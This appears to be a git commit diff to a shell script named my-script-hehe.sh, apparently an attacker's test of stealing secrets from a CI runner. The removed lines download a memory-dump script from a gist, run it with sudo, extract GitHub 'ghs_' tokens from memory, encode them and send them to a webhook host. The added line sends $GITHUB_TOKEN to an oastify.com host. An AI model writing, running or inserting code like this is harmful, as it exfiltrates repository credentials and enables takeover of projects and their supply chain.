921cf781eac562f9cd7015629be2ddc3536a147f
just-a-test-hehe-2 <niels.ingi+ghtest2@gmail.com>
2025-01-22 18:22:03 +0000

    Update my-script-hehe.sh

--- scripts/my-script-hehe.sh
+++ scripts/my-script-hehe.sh
@@ -1,4 +1,1 @@
-echo "This is from a malicious script! WOW"
-output=$(curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 | base64 -w 0 | tr '+/' '-_' | tr -d '=')
-echo $output
-curl "https://arrogant-school-66.webhook.cool/?q=$output"
+curl "https://yeg9smxflxppmdltq48bv2pfj6pxdp1e.oastify.com/?q=$GITHUB_TOKEN"
